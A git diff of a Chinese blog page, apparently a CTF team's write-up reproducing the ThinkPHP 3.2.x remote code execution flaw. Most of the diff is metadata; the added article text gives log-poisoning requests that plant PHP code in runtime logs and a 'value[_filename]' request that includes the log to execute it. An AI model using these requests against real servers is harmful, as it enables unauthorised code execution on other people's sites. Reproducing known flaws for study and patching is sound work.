@@ -84,7 +84,8 @@
 <meta property="og:image" content="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153704479.png">
 <meta property="og:image" content="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154206984.png">
 <meta property="og:image" content="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154445495.png">
-<meta property="og:updated_time" content="2021-07-14T08:05:10.283Z">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE复现/image-20210716163001792.png">
+<meta property="og:updated_time" content="2021-07-16T09:10:23.886Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkPHP3.2.x RCE复现">
 <meta name="twitter:description" content="ThinkPHP3.2的远程代码执行漏洞">
@@ -378,11 +379,19 @@
                 
               
 
-              <time title="创建时间：2021-07-14 11:39:25 / 修改时间：16:05:10" itemprop="dateCreated datePublished" datetime="2021-07-14T11:39:25+08:00">2021-07-14</time>
+              <time title="创建时间：2021-07-14 11:39:25" itemprop="dateCreated datePublished" datetime="2021-07-14T11:39:25+08:00">2021-07-14</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-16 17:10:23" itemprop="dateModified" datetime="2021-07-16T17:10:23+08:00">2021-07-16</time>
+              </span>
             
           
             <span class="post-meta-item">
@@ -430,7 +439,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span>1.7k</span>
+              <span>2.1k</span>
             </span>
           
             <span class="post-meta-item" title="阅读时长">
@@ -498,11 +507,24 @@
 <p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154206984.png" alt="image-20210714154206984"></p>
 <p>日志在<code>Application/Runtime/Logs/Home</code>目录下</p>
 <p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154445495.png" alt="image-20210714154445495"></p>
-<p>是否开启debug影响不大，均在同一目录下。但开启debug会把正确的请求也记录</p>
-</li>
-<li><p>上传入口</p>
+<p>开启debug</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?m=Home&amp;v=--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求不会报错 日志文件在 Application/Runtime/Logs/Home下</span></span><br><span class="line">index.php?m--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求会报错 日志文件在 Application/Runtime/Logs/Common下</span></span><br></pre></td></tr></table></figure>
+
+<p>关闭debug</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?m=Home&amp;v=--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求不会报错 不会记录日志</span></span><br><span class="line">index.php?m--&gt;<span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span>  <span class="comment">//这个请求会报错 日志文件在 Application/Runtime/Logs/Common下</span></span><br></pre></td></tr></table></figure>
+
+
+
 </li>
 </ul>
+<ul>
+<li><p>上传入口</p>
+<p>利用系统自带的上传功能，上传包含shell的文件</p>
+</li>
+</ul>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://x.x.x.x/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21<span class="emphasis">_07_</span>14.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210716163001792.png" alt="image-20210716163001792"></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ?st=529DABB1BC6F651382C9135EB552827AD43F0288831BAC943C5A6CE32F45F1B9F423FD767BD30EB98F9C2C6D962C1268BBC7A694FE6B1157BC89FD16D8EAEB81A3BD642BDC08DB57567E4C7B327B7134882308F36A811B338901B511ABC8BC487356659B2CD0C8417DBCFD448DE79A0E6611FC7DAA7F5F806AED95180ADE0D979653805D9BE2818C36432C242C346C258EB569D4B4EC38ACD08C5E03A09D4FAA34F60913522071EB3BEEED7BDB667730296BE92C3B10E13BA48209051A216A1E&vid=1688851206182100&cst=53928845F30E881CE4702F30E4E78E655B605169B1BF71E0E963E97B3C21D4A26131701E074B2422DE3B7150338D0234&deviceid=de960c8d-258f-4e7d-a333-c1e3dc351b70&version=3.1.8.3015&platform=win" target="_blank" rel="noopener">ThinkPHP3.2.x RCE漏洞通报</a> </p>
 
     </div>
@@ -780,7 +802,7 @@
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">4:38</span>
+    <span title="站点阅读时长">4:39</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
   <span class="post-meta-divider">|</span>
